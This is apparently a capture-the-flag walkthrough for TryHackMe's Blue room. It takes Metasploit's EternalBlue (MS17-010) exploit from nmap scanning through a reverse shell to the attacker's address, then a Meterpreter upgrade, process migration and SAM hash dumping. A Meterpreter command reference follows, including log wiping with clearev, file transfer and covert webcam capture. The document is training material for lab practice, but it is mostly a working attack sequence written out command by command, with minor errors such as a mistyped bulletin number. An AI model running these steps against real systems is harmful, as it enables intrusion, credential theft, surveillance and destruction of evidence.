# Scan example
This is based on the Blue room on TryHackMe (https://tryhackme.com/room/blue). 


Local IP: `10.18.72.167`   
Remote IP:`10.10.125.60`

## Initial scan
To understand what ports are available to me, I need to perform a scan and save the results in a directory called `nmap`:

`nmap -sC -sV -oN nmap/scan-1.txt 10.0.0.1`

**Flags**   
`-sC` - Use default set of scripts   
`-sV` - Try and get version information from open ports   
`-oN` - Save scan results in a text file (for future reference)   

**Results from scan**   

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 12:16 BST
Nmap scan report for 10.0.0.1
Host is up (0.028s latency).
Not shown: 991 closed tcp ports (conn-refused)

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.36 seconds
```

**Interesting ports**   
The SMB port 445 looks like a good candidate for an attack vector. To see if it is vulnerable, `nmap` can be used in conjunction with one if its many scripts.

## nmap scan using scripts
There are a lot of smb scripts, so I am going to limit the scripts it loads to one of the `smb vulnerability` payloads:

`nmap --script=smb-vuln-* 10.0.0.1`

**Results from scan**   

```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
```

The target is vulnerable to `ms17-101`, also known as Eternal Blue. To exploit this, I am going to use `metasploit`

## Metasploit

**Start metasploit**   
`msfconsole`

To find a suitable exploit, I am going to search for `ms17-010`:

`search ms17-010`

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

The first exploit looks like it could be a good candidate, so I need to tell metasploit to use that one:

`use exploit/windows/smb/ms17_010_eternalblue`

**Exploit options**   
Each exploit has a number of configurable options, usually there is at least one mandatory option that needs to be set. To find the list of options run:

`show options`

```
Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Looking at the `Required` options, I can see that `RHOSTS` and `LHOST`are not set. (As I am going through a VPN, I will need to make sure LHOST is set to my VPN address)

**Setting options**   
I need to set `RHOSTS` to be the IP address of the host I am attacking (10.18.72.167)

`set RHOSTS 10.10.125.60`

I need to set `LHOST` to be my IP (10.18.72.167)

`set LHOST 10.18.72.167`

**Running the exploit**   
My end-goal is to get a reverse shell on the server, so before I run the exploit I need to tell metasploit to inject a reverse shell payload:

`set payload windows/x64/shell/reverse_tcp`

I can now run the payload:

`exploit`

This should run the exploit, and drop me in to a shell on the target machine:

```
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

**Extending the exploit**   
In the Windows shell that you have created, send it to the background by typing:

`background`

To upgrade the windows shell to a meterpreter shell, run:   

`use shell_to_meterpreter`

**Meterpreter options**   
Just like exploits, different shells like meterpreter also have options:

`show options`

```
Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```
The `LHOST` option is required, but not set. We can set this to our local IP:

`set LHOST 10.18.72.167`

The `SESSION` option is required, but not set. To find a session for it to connect to, run:

`sessions`

```
Id  Name  Type               Information                                               Connection
--  ----  ----               -----------                                               ----------
1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.72.167:4444 -> 10.10.125.60:49196 (10.10.125.60)
```

Our current session is `1`, so we need to tell meterpreter to use this session:

`set session 1`

**Running the exploit**   
To get our meterpreter shell injected, run:

`exploit`

After this has run, you can check to see if the new session has been created:

`sessions`

```
  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.72.167:4444 -> 10.10.32.37:49170 (10.10.32.37)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.72.167:4433 -> 10.10.32.37:49172 (10.10.32.37)

```

**Join the new session**   
The new session id is `2`, so run an interactive session:

`sessions -i 2`


**Check running processes**   
We now have access to the system, but our process might not have the `SYSTEM` privileges so we need to find a process to migrate to. To see what processes are running, run:

`ps`

```
PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 ...   ...   ............          ...   .        .. ................           ................................
```

`winlogon.exe` looks to be a suitable process, so run:

`migrate -N winlogon.exe`

**Dumping hashes**   
Finally, we can dump out the hashes for the users:

`hashdump`

This will give us something like:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Moving around**   
You can perform commands in meterpreter such as:

**help**  
This will display the meterpreter help menu.


   meterpreter > help

   Core Commands
   =============

      Command       Description
      -------       -----------
      ?             Help menu
      background    Backgrounds the current session
      channel       Displays information about active channels



**background**  
This will send the current meterpreter session to the background and return you to the `msf` prompt.

```
meterpreter > background
msf exploit(ms08_067_netapi) > sessions -i 1
[*] Starting interaction with 1...
```


**cat**  
This will display the contents of a file when it's given as an arguement

```
meterpreter > cat file.txt
This is just a plain text file
```


**cd**  
This changes the current working directory on the target host

```
cd c:\\windows
```


**clearev**  
This clears the *Application*, *System*, and *Security* logs on the Windows target.

```
meterpreter > clearev
[*] Wiping 97 records from Application...
[*] Wiping 415 records from System...
[*] Wiping 0 records from Security...
meterpreter >
```


**download**  
This will download a file from the remote machine, you will need to give double slashes when interacting with a Windows machine

`download c:\\boot.ini`


**edit**  
This is a wrapper around `vim` and allows editing of a file on the target machine.

**execute**  
This runs a command on the target.

```
meterpreter > execute -f cmd.exe -i -H
Process 38320 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```


**hashdump**  
This will dump the contents of the SAM database.

```
hashdump 

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
```


**ipconfig**  
This displays the network interfaces and addresses on the remote machine.

```
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0

AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: 00:0c:29:10:f5:15
IP Address  : 192.168.1.104
Netmask     : 255.255.0.0
```

**ls**  
This will list the files in the current remote directory.

```
meterpreter > ls

Listing: C:\Documents and Settings\victim
=========================================

Mode              Size     Type  Last modified                   Name
----              ----     ----  -------------                   ----
40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
```


**migrate**  
This will allow you to migrate the current process to another process on the target.

**ps**  
This displays a list of running processes on the target.

```
meterpreter > ps

Process list
============

    PID   Name                  Path
    ---   ----                  ----
    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
```


**search**  
This provides a way of locating specific files on the target host. 

```
meterpreter > search -f autoexec.bat
Found 1 result...
    c:\AUTOEXEC.BAT
```

**shell**  
This will present you with a standard shell on the target system.

```
meterpreter > shell
Process 39640 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```


**upload**  
This allows you to upload a file on the target machine, you will need to give double slashes when interacting with a Windows machine

`upload file.exr c:\\users`


**webcam_list**  
This will display currently available web cams on the target host.

```
meterpreter > webcam_list
1: Creative WebCam NX Pro
2: Creative WebCam NX Pro (VFW)
```


**webcam_snap**  
This grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.

```
meterpreter > webcam_snap -h
Usage: webcam_snap [options]
Grab a frame from the specified webcam.

OPTIONS:

    -h      Help Banner
    -i   The index of the webcam to use (Default: 1)
    -p   The JPEG image path (Default: 'gnFjTnzi.jpeg')
    -q   The JPEG image quality (Default: '50')
    -v   Automatically view the JPEG image (Default: 'true')

```


```
meterpreter > webcam_snap -i 1 -v false
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /home/Offsec/YxdhwpeQ.jpeg
```












